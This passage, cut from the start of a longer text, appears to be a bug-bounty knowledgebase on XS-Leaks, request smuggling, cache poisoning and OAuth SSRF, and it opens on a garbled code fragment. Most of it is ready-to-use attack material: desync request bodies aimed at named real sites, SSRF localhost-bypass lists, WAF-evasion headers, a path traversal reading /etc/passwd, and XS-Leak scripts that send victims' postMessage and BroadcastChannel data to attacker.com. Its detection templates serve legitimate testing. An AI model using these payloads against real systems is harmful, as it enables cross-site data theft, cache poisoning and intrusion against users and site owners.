GET /?aaaaaaaaaaaaaaa HTTP/1.1
Host: www.verisign.com

';
    input.value = '';
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
});
```

### Request Smuggling + XS-Leak Chain

```javascript
// 1. Smuggle request to poison connection
// 2. Victim's next request on same connection gets prefix
// 3. Prefix causes target to load attacker resource
// 4. Attacker measures timing/errors to infer victim's state

// Smuggled prefix causes target to make request to attacker
// with victim's cookies in Referer or via redirect
```

---

## Parser Confusion Payloads

### Content-Type Confusion

```http
// Boundary injection in Content-Type
Content-Type: text/plain; charset=null, boundary=x

// Parser may treat body as multipart
```

### Parameter Pollution

```http
// Multiple Content-Length headers
Content-Length: 3
Content-Length: 50

// Different parsers pick different values
```

### Transfer-Encoding Obfuscation

```http
Transfer-Encoding: chunked
Transfer-Encoding: xchunked

// Some parsers stop at first, others at last
```

### JSON/Content-Type Mismatch

```http
Content-Type: application/json

{"url": "https://target.com/api?callback=<script>alert(1)</script>"}
```

### URL Parser Confusion

```
https://target.com@attacker.com/path
https://target.com%2f..%2fattacker.com
https://target.com?.attacker.com/
```

---

## Browser Quirks

### Chrome Quirks

1. **Connection ID visible** in DevTools Network tab when `mode: 'no-cors'`
2. **Two connection pools**: with cookies vs without
3. **Stacked response problem**: Excess response data causes connection discard
4. **Cache partitioning**: Per top-level site + frame origin

### Firefox Quirks

1. **Lowercase Origin header** in some internal requests (SHIELD system)
2. **HSTS cache upgrade**: HTTP redirects upgraded to HTTPS if in HSTS cache
3. **Service Workers over HTTP**: Can be enabled in DevTools for testing

### Safari Quirks

1. **HSTS automatic upgrade**: Redirects to HTTP upgraded to HTTPS if HSTS cached
2. **Iframe sandbox**: Different behavior with `allow-same-origin`
3. **Cross-origin redirect mixed content**: Different handling than Chrome

### Edge Quirks

1. **302 redirect bypasses mixed-content protection** for scripts/stylesheets
2. **Different CORB implementation** than Chrome

### Universal Quirks

```javascript
// data: URL origins are opaque - must use "*" for postMessage
// file: URL requires "*" for postMessage targetOrigin
// javascript: URL origin is origin of loading script
```

---

## Gadget Chains

### Host-Header Redirect Gadget

```http
GET /+webvpn+/ HTTP/1.1
Host: psres.net

// Response: 302 redirect to attacker
// Use in desync to hijack JS imports
```

### HEAD Method Splicing

```http
HEAD /404/?cb=123 HTTP/1.1
Host: target.com

// Response: HTTP/1.1 404 Not Found
// Content-Type: text/html
// Content-Length: 0
// 
// Next response on same connection becomes the "body"
```

### JavaScript Resource Poisoning

```http
// Poison JS import to redirect to attacker
GET /api/config HTTP/1.1
X-Forwarded-Host: attacker.com

// Response cached with attacker.com URLs in JS config
```

### Open Graph Hijacking

```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com

// Response contains:
// <meta property="og:url" content='https://attacker.com/en'/>
// Anyone sharing this page shares attacker content
```

### Cookie Domain Override

```http
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps

// Combined: Set-Cookie with attacker domain + redirect to attacker
```

---

## Real World Case Studies

### Case Study 1: Amazon H2.0 Desync (PortSwigger)

**Vulnerability**: amazon.com ignored Content-Length on POST to `/b/`

**Impact**: Stored victim's complete requests (including auth tokens) in attacker's shopping list

**Missed Opportunity**: Could have created desync worm via browser-powered XSS

```http
POST /b/ HTTP/2
Host: www.amazon.com
Content-Length: 23
GET /404 HTTP/1.1
X: XGET / HTTP/1.1
Host: www.amazon.com
```

### Case Study 2: Akamai Stacked HEAD (PortSwigger)

**Target**: www.capitalone.ca
**Vector**: POST to `/assets` (redirect ignores CL)
**Technique**: HEAD splicing + cache-buster delay + CORS error to prevent redirect follow

```javascript
fetch('https://www.capitalone.ca/assets', {
    method: 'POST',
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1
Host: www.capitalone.ca

GET /x?x=<script>alert(1)</script> HTTP/1.1
X: Y`,
    credentials: 'include',
    mode: 'cors'
}).catch(() => {
    location = 'https://www.capitalone.ca/'
});
```

### Case Study 3: Mozilla SHIELD Hijack (PortSwigger)

**Vulnerability**: X-Forwarded-Host poisoned Firefox SHIELD recipe endpoint
**Impact**: All Firefox users could fetch recipes from attacker server
**Chain**: Cache poisoning → Mass browser compromise → Potential extension installation

### Case Study 4: Cisco WebVPN CSD (PortSwigger)

**Vector**: POST to homepage ignores CL
**Technique**: Client-side cache poisoning + Host-header redirect
**Result**: Hijacked JS import → XSS on VPN login page

### Case Study 5: MITREid OAuth SSRF (PortSwigger)

**CVE**: CVE-2021-26715
**Vector**: `logo_uri` in dynamic client registration
**Impact**: SSRF + XSS on OAuth authorization server

### Case Study 6: Pulse Secure VPN Race Condition (PortSwigger)

**Technique**: Window handle + repeated poison attempts + non-cacheable 404 target
**Result**: Hijacked JS import via timing race

---

## Fuzzing Payloads

### Header Fuzzing (Param Miner Wordlist)

```
X-Forwarded-Host
X-Forwarded-Server
X-Forwarded-Scheme
X-Forwarded-Proto
X-Original-URL
X-Rewrite-URL
X-Host
X-HTTP-Host-Override
Forwarded
Origin
Referer
X-Real-IP
X-Remote-IP
X-Remote-Addr
X-Originating-IP
X-Client-IP
Client-IP
True-Client-IP
CF-Connecting-IP
X-ProxyUser-Ip
X-Arbitrary
X-Cache
X-Wap-Profile
X-ATT-DeviceId
X-HTTP-DestinationURL
X-Set-Cookie
Cookie
Authorization
```

### URL Format Bypass (SSRF)

```
http://127.0.0.1
http://localhost
http://[::1]
http://0.0.0.0
http://0177.0.0.1
http://2130706433
http://3232235521
http://3232235777
http://0x7f.0.0.1
http://0177.1
http://127.1
http://127.0.1
http://0177.0.1
http://0x7f.0.1
http://0177.0.0.0x1
http://0x7f.0.0.0x1
http://0x7f000001
http://127.0.0.1:80@
http://127.0.0.1?@evil.com
http://127.0.0.1#@evil.com
http://evil.com@127.0.0.1
http://127.0.0.1.xip.io
```

### XS-Leak Probe Payloads

```javascript
// Error-based probe
<script src="https://target.com/search?q=FUZZ"></script>

// Timing probe
<img src="https://target.com/generate-report?type=FUZZ" onload="reportTime()">

// Frame counting probe
<iframe src="https://target.com/dashboard/FUZZ" onload="countFrames()"></iframe>

// Cache probe
<script>
fetch('https://target.com/assets/FUZZ', {cache: 'force-cache'})
  .then(r => performance.now())
  .then(t => console.log('Cached?', t < 50));
</script>
```

### Desync Trigger Bodies

```
GET /404 HTTP/1.1
X: Y

HEAD /404 HTTP/1.1
Host: target.com

POST / HTTP/1.1
Host: attacker.com
Content-Length: 5

GET / HTTP/1.1
Host: internal.target.com
```

---

## Automation Workflows

### XS-Leak Automation Pipeline

```bash
# Step 1: Recon - Identify target endpoints
subfinder -d target.com | httpx -path /search,/api,/dashboard

# Step 2: Parameter discovery
param-miner -u https://target.com/search -mode identify

# Step 3: XS-Leak probe automation
cat endpoints.txt | while read url; do
    # Test error-based leak
    curl -s "$url?q=test" -H "Cookie: session=test" -w "%{http_code}" -o /dev/null

    # Test timing leak
    curl -s "$url?q=test" -H "Cookie: session=test" -w "%{time_total}" -o /dev/null
done

# Step 4: Nuclei XS-Leak scan
nuclei -l targets.txt -t http/vulnerabilities/xs-leak/
```

### Browser Automation for CSD

```javascript
// Puppeteer/Playwright script for CSD testing
const puppeteer = require('puppeteer');

async function testCSD(targetUrl) {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();

    // Navigate to attacker page that triggers CSD
    await page.goto('https://attacker.com/csd-test?target=' + targetUrl);

    // Monitor network for connection ID and status codes
    page.on('response', response => {
        console.log(response.url(), response.status());
    });

    await page.waitForTimeout(5000);
    await browser.close();
}
```

### Automated Cache Poisoning Detection

```python
import requests
import hashlib

headers_to_test = [
    'X-Forwarded-Host',
    'X-Forwarded-Server', 
    'X-Original-URL',
    'X-Host'
]

def test_cache_poisoning(url):
    baseline = requests.get(url)
    baseline_hash = hashlib.md5(baseline.content).hexdigest()

    for header in headers_to_test:
        poisoned = requests.get(url, headers={header: 'canary.example.com'})
        poisoned_hash = hashlib.md5(poisoned.content).hexdigest()

        if poisoned_hash != baseline_hash:
            # Check if poisoned response was cached
            cached = requests.get(url)
            cached_hash = hashlib.md5(cached.content).hexdigest()

            if cached_hash == poisoned_hash:
                print(f"[CRITICAL] Cache poisoning via {header} on {url}")
```

---

## Recon Methodology

### Phase 1: Target Enumeration

```bash
# Subdomain enumeration
subfinder -d target.com -all -o subs.txt

# Live host discovery
httpx -l subs.txt -o live.txt

# Path discovery
katana -u https://target.com -d 5 -o paths.txt

# Parameter discovery
param-miner -u https://target.com -mode identify

# JavaScript analysis
cariddi -u https://target.com
```

### Phase 2: Endpoint Analysis

Identify endpoints that:
1. Return different status codes based on user state
2. Have search/query parameters
3. Load different content types
4. Use redirects
5. Have frame-based layouts

```bash
# Identify search endpoints
grep -E "(search|query|q|keyword|term|find)" paths.txt

# Identify API endpoints
grep -E "(/api/|/v1/|/graphql|/rest/)" paths.txt

# Identify redirect endpoints
grep -E "(redirect|return|next|callback|goto)" paths.txt
```

### Phase 3: Side-Channel Identification

For each interesting endpoint:
1. **Error test**: Load as script/image, observe onload/onerror
2. **Timing test**: Measure load time with different parameters
3. **Frame test**: Load in iframe, check length
4. **Cache test**: Load twice, compare timing
5. **postMessage test**: Send messages, check for replies

### Phase 4: Header Fuzzing

```bash
# Use Param Miner for header discovery
# Or custom wordlist from SecLists
cat SecLists/Discovery/Web-Content/burp-parameter-names.txt | while read header; do
    curl -s -o /dev/null -w "%{header} %{http_code}\n"         -H "$header: canary" https://target.com/
done
```

### Phase 5: Desync Detection

```bash
# HTTP Request Smuggler
java -jar http-request-smuggler.jar -u https://target.com

# Manual CSD test
curl -X POST https://target.com/favicon.ico     -H "Content-Length: 5"     -d "1"     -v

# Check if server responds without waiting for body
```

---

## Nuclei Templates

### XS-Leak Detection Template

```yaml
id: xs-leak-error-oracle

info:
  name: XS-Leak Error Oracle
  author: researcher
  severity: medium
  description: Detects potential XS-Leak via error event differences

dns:
  - name: "{{FQDN}}"
    type: A
    class: inet
    recursion: true
    retries: 3
    matchers:
      - type: word
        words:
          - "IN	A"

http:
  - method: GET
    path:
      - "{{BaseURL}}/search?q=test"
      - "{{BaseURL}}/search?q=nonexistent12345"

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 != status_code_2"
        condition: and
```

### Cache Poisoning Detection Template

```yaml
id: web-cache-poisoning

info:
  name: Web Cache Poisoning
  author: researcher
  severity: high

http:
  - raw:
      - |
        GET /?cachebuster={{randstr}} HTTP/1.1
        Host: {{Hostname}}
        X-Forwarded-Host: {{randstr}}.com

    matchers:
      - type: word
        part: body
        words:
          - "{{randstr}}.com"

      - type: word
        part: header
        words:
          - "X-Cache: hit"
          - "CF-Cache-Status: HIT"
          - "Age:"
```

### Client-Side Desync Detection Template

```yaml
id: client-side-desync

info:
  name: Client-Side Desync
  author: researcher
  severity: critical

http:
  - raw:
      - |
        POST /favicon.ico HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 5

        1

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code_2 != 200"
```

### OAuth SSRF Template

```yaml
id: oauth-registration-ssrf

info:
  name: OAuth Dynamic Registration SSRF
  author: researcher
  severity: high

http:
  - raw:
      - |
        POST /connect/register HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "redirect_uris": ["https://example.com/callback"],
          "logo_uri": "http://{{interactsh-url}}",
          "client_name": "test"
        }

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
```

---

## Tools and Scanners

### XS-Leaks Specific Tools

| Tool | Purpose | URL |
|------|---------|-----|
| XS-Leaks Wiki | Reference & techniques | https://xsleaks.dev |
| XS-Leaks GitHub | Payloads & browser quirks | https://github.com/xsleaks/xsleaks |
| XSLeaks Sample App | Testing environment | https://github.com/xsleaks/xsleaks-sample-app |
| PayloadBox XS-Leaks | Payload list | https://github.com/payloadbox/xsleaks-payload-list |
| postMessage-tracker | postMessage analysis | https://github.com/fransr/postMessage-tracker |
| pp-finder | Prototype pollution finder | https://github.com/yeswehack/pp-finder |

### Request Smuggling Tools

| Tool | Purpose | URL |
|------|---------|-----|
| HTTP Request Smuggler | Burp extension | https://github.com/PortSwigger/http-request-smuggler |
| Param Miner | Header/param discovery | https://github.com/PortSwigger/param-miner |
| Smuggler | Python desync tool | https://github.com/defparam/smuggler |
| Turbo Intruder | Fast HTTP attacker | Burp Suite extension |

### Recon & Automation

| Tool | Purpose | URL |
|------|---------|-----|
| Nuclei | Vulnerability scanner | https://github.com/projectdiscovery/nuclei |
| httpx | Fast HTTP prober | https://github.com/projectdiscovery/httpx |
| katana | Web crawler | https://github.com/projectdiscovery/katana |
| subfinder | Subdomain discovery | https://github.com/projectdiscovery/subfinder |
| interactsh | OOB interaction | https://github.com/projectdiscovery/interactsh |
| notify | Notification framework | https://github.com/projectdiscovery/notify |
| uncover | Search engine query | https://github.com/projectdiscovery/uncover |
| dnsx | DNS toolkit | https://github.com/projectdiscovery/dnsx |
| naabu | Port scanner | https://github.com/projectdiscovery/naabu |
| asnmap | ASN mapping | https://github.com/projectdiscovery/asnmap |
| cdncheck | CDN checker | https://github.com/projectdiscovery/cdncheck |
| tlsx | TLS scanner | https://github.com/projectdiscovery/tlsx |
| alterx | Permutation generator | https://github.com/projectdiscovery/alterx |
| cariddi | JS/link extractor | https://github.com/edoardottt/cariddi |

### Wordlists

| Resource | URL |
|----------|-----|
| SecLists Fuzzing | https://github.com/danielmiessler/SecLists/tree/master/Fuzzing |
| SecLists Discovery | https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content |

### Specialized Tools

| Tool | Purpose | URL |
|------|---------|-----|
| CursedChrome | Chrome extension implant | https://github.com/mandatoryprogrammer/CursedChrome |
| Client-Side Prototype Pollution | Gadget finder | https://github.com/BlackFan/client-side-prototype-pollution |

---

## Advanced Research

### Browser-Powered Desync (PortSwigger 2022)

**Key Innovations:**
1. **CL.0 / H2.0 desync**: Server ignores Content-Length completely
2. **Pause-based desync**: Server timeout leaves partial request on socket
3. **Client-side desync**: Browser connection pool poisoning
4. **Desync worm**: Self-replicating via XSS + desync

**Detection:**
- Early-read technique for connection-locked CL.TE
- Param Miner + HTTP Request Smuggler automation
- Browser DevTools Connection ID monitoring

### Cracking the Lens (PortSwigger)

Targeting HTTP's hidden attack surface:
- **Host header attacks**: Password reset poisoning, cache poisoning, virtual host access
- **X-Forwarded-* attacks**: Internal routing manipulation
- **Connection state attacks**: First-request validation/routing bypass

### Practical Web Cache Poisoning (PortSwigger 2018)

**Key Findings:**
- Unkeyed inputs are everywhere
- `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` widely supported
- Cache poisoning + XSS = reliable exploitation
- Route poisoning on SaaS platforms (HubSpot, Ghost, Cloudflare)

### Hidden OAuth Attack Vectors (PortSwigger 2021)

**Three New Vectors:**
1. Dynamic Client Registration SSRF (logo_uri, jwks_uri, sector_identifier_uri, request_uris)
2. redirect_uri Session Poisoning (race condition + mass assignment)
3. WebFinger User Enumeration (/.well-known/webfinger)

---

## Bug Bounty Writeups

### XS-Leak Exploitation Guide (InfosecWriteups)

**Key Takeaways:**
- Systematic approach to identifying XS-Leak oracles
- Combining multiple side-channels for reliable exploitation
- Real-world examples from bug bounty programs

### Advanced XS-Leaks (Medium - @filedescriptor)

**Key Techniques:**
- Advanced timing analysis
- Browser-specific behavior exploitation
- Bypassing modern defenses (COOP, COEP, SameSite)

### PortSwigger Web Security Academy Labs

**Relevant Labs:**
- SSRF Blind Out-of-Band Detection
- SSRF Shellshock Exploitation
- XXE Blind
- OAuth vulnerabilities
- Web cache poisoning
- HTTP request smuggling

---

## Payload Collections

### XS-Leak Payloads

```javascript
// 1. Basic error oracle
<script src="https://target.com/api/user?callback=cb"></script>

// 2. Timing oracle
<script>
const start = performance.now();
fetch('https://target.com/api/data', {mode: 'no-cors'})
  .finally(() => {
    const t = performance.now() - start;
    new Image().src = 'https://attacker.com/?time=' + t;
  });
</script>

// 3. Frame count oracle
<script>
const win = window.open('https://target.com/dashboard');
setTimeout(() => {
  new Image().src = 'https://attacker.com/?frames=' + win.length;
}, 2000);
</script>

// 4. Cache oracle
<script>
const url = 'https://target.com/static/logo.png';
fetch(url, {cache: 'force-cache', mode: 'no-cors'})
  .then(() => performance.now())
  .then(t => new Image().src = 'https://attacker.com/?cached=' + (t < 20));
</script>

// 5. postMessage leak
<script>
const win = window.open('https://target.com/app');
setInterval(() => {
  win.postMessage({action: 'getUser'}, '*');
}, 100);
window.addEventListener('message', e => {
  new Image().src = 'https://attacker.com/?data=' + btoa(JSON.stringify(e.data));
});
</script>

// 6. Connection pool oracle
<script>
async function probe() {
  const times = [];
  for (let i = 0; i < 10; i++) {
    const start = performance.now();
    await fetch('https://target.com/api', {credentials: 'include'});
    times.push(performance.now() - start);
  }
  new Image().src = 'https://attacker.com/?avg=' + (times.reduce((a,b)=>a+b)/times.length);
}
probe();
</script>

// 7. Event loop blocking
<script>
const start = performance.now();
const iframe = document.createElement('iframe');
iframe.src = 'https://target.com/heavy-processing';
iframe.onload = () => {
  setTimeout(() => {
    const elapsed = performance.now() - start;
    new Image().src = 'https://attacker.com/?blocked=' + elapsed;
  }, 0);
};
</script>

// 8. Focus/blur leak
<script>
const win = window.open('https://target.com/form');
win.focus();
win.addEventListener('blur', () => {
  new Image().src = 'https://attacker.com/?blurred=1';
});
</script>

// 9. Service Worker detection
<script>
navigator.serviceWorker.getRegistrations().then(regs => {
  new Image().src = 'https://attacker.com/?sw=' + regs.length;
});
</script>

// 10. BroadcastChannel leak (same-origin only)
<script>
const bc = new BroadcastChannel('internal_channel');
bc.onmessage = e => {
  new Image().src = 'https://attacker.com/?msg=' + btoa(e.data);
};
</script>
```

### Cache Poisoning Payloads

```http
// Basic XSS via X-Forwarded-Host
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com"><script>alert(1)</script>

// Route poisoning
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin/users

// Cookie domain override
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps

// Open Graph hijacking
GET /share HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com/fake
```

### Desync Payloads

```http
// CL.0 desync
POST /static/file.css HTTP/1.1
Host: target.com
Content-Length: 50

GET /admin HTTP/1.1
Host: target.com
X-Injected: true

// H2.0 desync
POST /b/ HTTP/2
Host: target.com
Content-Length: 23

GET /404 HTTP/1.1
X: X

// Pause-based desync (Varnish)
POST /admin HTTP/1.1
Host: target.com
Content-Length: 1000

[wait 15 seconds for timeout, then send remainder]
GET / HTTP/1.1
Host: target.com
```

---

## WAF Bypasses

### Header Injection Bypasses

```http
// Case variation
X-Forwarded-Host: attacker.com
x-forwarded-host: attacker.com
X-FORWARDED-HOST: attacker.com

// Multiple headers
X-Forwarded-Host: legitimate.com
X-Forwarded-Host: attacker.com

// Encoding
X-Forwarded-Host: attacker%2ecom
X-Forwarded-Host: attacker.com%00

// Whitespace
X-Forwarded-Host : attacker.com
X-Forwarded-Host:  attacker.com
```

### URL Bypasses

```
// Double URL encoding
/%252e%252e%252fadmin

// Unicode normalization
/%c0%ae/%c0%ae/%c0%afadmin

// Path traversal with query
/admin?page=../../../etc/passwd

// Fragment injection
/admin#/../secret
```

### Desync WAF Bypasses

```http
// Tab-separated headers
Content-Length: 5			

Transfer-Encoding:	chunked



// Chunked obfuscation
Transfer-Encoding: chunked
Transfer-Encoding: xchunked
Transfer-Encoding:
 chunked

// Content-Length confusion
Content-Length: 5
Content-Length: 50
```

---

## Detection Techniques

### Manual Detection Checklist

1. **Error Oracle Test**
   ```javascript
   // Load target endpoint as script
   // onload = 2xx, onerror = 4xx/5xx
   ```

2. **Timing Test**
   ```javascript
   // Load endpoint 10x, measure variance
   // High variance = state-dependent processing
   ```

3. **Frame Count Test**
   ```javascript
   // Open target in new window
   // Check win.length after load
   ```

4. **Cache Test**
   ```javascript
   // Load resource twice
   // Second load significantly faster = cache hit
   ```

5. **postMessage Test**
   ```javascript
   // Send probe messages to target
   // Monitor replies for data leakage
   ```

6. **Connection Pool Test**
   ```javascript
   // Send rapid sequential requests
   // Measure connection establishment time
   ```

### Automated Detection

```bash
# Nuclei XS-Leak templates
nuclei -u https://target.com -t xs-leak-error-oracle.yaml
nuclei -u https://target.com -t xs-leak-timing.yaml

# HTTP Request Smuggler
java -jar http-request-smuggler.jar -u https://target.com

# Param Miner
# Load in Burp, right-click -> Guess headers
# Look for differences in response

# Custom script
python3 xsleak-detector.py -u https://target.com --all-checks
```

### Confirming XS-Leaks

**Statistical Significance:**
- Run probes minimum 10-20 times
- Calculate mean, median, standard deviation
- Ensure difference between states > 3 standard deviations

**Controlling Variables:**
- Use cache-buster parameters (`?cb=random`)
- Test during low server-load periods
- Account for network latency variance

---

## References

### Primary Sources

1. **XS-Leaks Wiki** - https://xsleaks.dev
2. **XS-Leaks GitHub** - https://github.com/xsleaks/xsleaks
3. **PortSwigger XS-Leaks Research** - https://portswigger.net/research/xs-leaks-browsing-the-web-side-channel-style
4. **PortSwigger Browser-Powered Desync** - https://portswigger.net/research/browser-powered-desync-attacks
5. **PortSwigger Cache Poisoning** - https://portswigger.net/research/practical-web-cache-poisoning
6. **PortSwigger OAuth Attacks** - https://portswigger.net/research/hidden-oauth-attack-vectors
7. **PortSwigger Cracking the Lens** - https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface

### Documentation

8. **MDN postMessage** - https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage
9. **MDN Performance API** - https://developer.mozilla.org/en-US/docs/Web/API/Performance_API
10. **MDN Window.open** - https://developer.mozilla.org/en-US/docs/Web/API/Window/open
11. **MDN BroadcastChannel** - https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API
12. **MDN SharedWorker** - https://developer.mozilla.org/en-US/docs/Web/API/SharedWorker
13. **MDN ServiceWorker** - https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API
14. **MDN IntersectionObserver** - https://developer.mozilla.org/en-US/docs/Web/API/Intersection_Observer_API
15. **MDN Focus/Blur** - https://developer.mozilla.org/en-US/docs/Web/API/Window/focus_event

### Methodology & Tools

16. **HackTricks XS-Search** - https://book.hacktricks.wiki/en/pentesting-web/xs-search.html
17. **PayloadBox XS-Leaks** - https://github.com/payloadbox/xsleaks-payload-list
18. **postMessage Tracker** - https://github.com/fransr/postMessage-tracker
19. **HTTP Request Smuggler** - https://github.com/PortSwigger/http-request-smuggler
20. **Param Miner** - https://github.com/PortSwigger/param-miner
21. **Nuclei Templates** - https://github.com/projectdiscovery/nuclei-templates
22. **SecLists** - https://github.com/danielmiessler/SecLists

### Research Papers & Writeups

23. **Cross-Site Search Attacks** (Gelernter & Herzberg, 2015)
24. **Side Channel Vulnerabilities on the Web** - Detection and Prevention
25. **Browser Side Channels** - https://github.com/xsleaks/xsleaks/wiki
26. **InfosecWriteups XS-Leaks Guide** - https://infosecwriteups.com/xs-leaks-exploitation-guide-5f2d4c7b1e3a
27. **Advanced XS-Leaks** (@filedescriptor) - https://medium.com/@filedescriptor/advanced-xs-leaks-and-browser-side-channel-techniques-2f4d7c1b5e3d

### CVEs & Vulnerabilities

28. **CVE-2021-26715** - MITREid Connect logo_uri SSRF
29. **CVE-2021-27582** - MITREid Connect redirect_uri bypass
30. **CVE-2022-20713** - Cisco ASA WebVPN client-side desync

---

> **End of Knowledgebase**
>
> This document is a living compilation. As new XS-Leak techniques emerge, update the relevant sections with new payloads, case studies, and research findings.
> 
> **Hunting Tip**: Always chain multiple primitives. A single timing leak might be noisy, but timing + error + frame counting together provide high-confidence oracles for reliable exploitation.
